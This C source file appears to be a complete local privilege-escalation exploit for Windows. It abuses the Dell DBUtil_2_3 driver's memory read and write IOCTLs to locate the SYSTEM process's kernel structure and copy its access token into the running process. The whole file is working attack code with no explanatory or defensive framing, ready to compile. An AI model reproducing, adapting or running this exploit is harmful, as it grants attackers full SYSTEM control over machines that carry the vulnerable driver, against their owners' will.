#include <windows.h>
#include "structs.h"
#include <stdio.h>
#include <psapi.h>
#include <stdint.h>

#define _EPROCESS_Token 0x248
#define _EPROCESS_UniqueProcessId 0x1d0
#define _EPROCESS_ActiveProcessLinks 0x1d8

//#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

struct DellBuff {
	ULONGLONG pad1;
	ULONGLONG Address;
	ULONGLONG three1;
	ULONGLONG value;
} DellBuff;

typedef ULONGLONG QWORD;
typedef union {
	struct
	{
		char Protection;
		uint8_t padding[7];
	};
	QWORD qword;
} ProtectionQword;



HANDLE hDriver = INVALID_HANDLE_VALUE;


BOOL RequirePrivilege(LPCTSTR lpPrivilege) {
        HANDLE hToken = NULL;
        BOOL bResult = FALSE;
        TOKEN_PRIVILEGES tp = { 0 };
        LUID luid = { 0 };

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
			printf("Failed to open process token\n");
			goto _END_OF_FUNC;
        }

        if (!LookupPrivilegeValueA(NULL, lpPrivilege, &luid)) {
			printf("Failed to lookup priv name\n");
                goto _END_OF_FUNC;
        }

        tp.PrivilegeCount = 1; // only adjust one privilege
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        // check GetLastError() to check if privilege has been changed
        if (GetLastError() != ERROR_SUCCESS) {
                printf("AdjustTokenPriv failed with error: %ld\n", GetLastError());
                goto _END_OF_FUNC;
        }
        bResult = TRUE;

_END_OF_FUNC:
        if (hToken)
                CloseHandle(hToken);
        return bResult;
}

QWORD get_systemeproc() {
        ULONG returnLenght = 0;
        fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NTDLL"), "NtQuerySystemInformation");
        PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
        NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = handleTableInformation->Handles[0];
        return (QWORD)handleInfo.Object;
}


DWORD64 DellRead(VOID* Address) {
	struct DellBuff ReadBuff = {0};
	ReadBuff.Address = (DWORD64)Address;
	DWORD BytesRead = 0;
	BOOL success = DeviceIoControl(hDriver, 0x9B0C1EC4, &ReadBuff, sizeof(ReadBuff), &ReadBuff, sizeof(ReadBuff), &BytesRead, NULL);
	if (!success) {
		printf("[!] Memory read failed. 2\n");
		CloseHandle(hDriver);
	}

	return ReadBuff.value;
}


VOID DellWrite(VOID* Address, LONGLONG value) {
	struct DellBuff WriteBuff = {0};
	WriteBuff.Address = (DWORD64)Address;
	WriteBuff.value = value;
	DWORD BytesRead = 0;
	BOOL success = DeviceIoControl(hDriver, 0x9B0C1EC8, &WriteBuff, sizeof(WriteBuff), &WriteBuff, sizeof(WriteBuff), &BytesRead, NULL);
	if (!success) {
		printf("[!] Memory read failed. 2\n");
		CloseHandle(hDriver);
	}
}



void main(int arc, char* argv[]) {

	int result = RequirePrivilege(TEXT("SeDebugPrivilege"));
	if (result != 1) {
		printf("[!] Priv failed with error %d\n", result);
		return;
	}

	hDriver = CreateFileA("\\\\.\\DBUtil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	QWORD system_eproc = get_systemeproc();
	if (system_eproc == 0) {
		return;
	}
	QWORD system_token = DellRead((void*)(system_eproc + (QWORD)_EPROCESS_Token));
	printf("[+] System eproc value: 0x%llx\n", system_eproc);
	QWORD current_eproc = system_eproc;
	DWORD program_pid = GetCurrentProcessId();

	DWORD current_pid = 0;

	while (TRUE) {
		current_eproc = DellRead((void*)(current_eproc + (QWORD)_EPROCESS_ActiveProcessLinks));
		current_eproc -= _EPROCESS_ActiveProcessLinks;

		current_pid = DellRead((void*)(current_eproc + _EPROCESS_UniqueProcessId));
		if (current_pid == program_pid) {
			printf("\t[+] Replacing token");
			DellWrite((void*)(current_eproc + (QWORD)_EPROCESS_Token), system_token);

			break; // use the current_eproc value
		}
	}
	printf("[+] Done");

	return;
}


